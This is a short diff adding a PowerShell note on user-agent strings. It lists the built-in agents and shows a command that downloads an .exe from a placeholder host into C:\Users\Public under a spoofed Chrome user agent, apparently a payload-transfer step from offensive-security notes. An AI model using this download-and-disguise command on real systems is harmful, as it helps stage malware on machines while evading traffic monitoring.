@@ -1,0 +1,10 @@
+In windows powershell, you can change the user agent:
+Invoke-WebRequest can be used;
+
+Listing out user agents:
+[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl
+
+Invoke a web request with a chrome user agent:
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://<host-ip>:<port>/<filename.exe> -UserAgent $UserAgent -OutFile "C:\Users\Public\<filename.exe>"
+
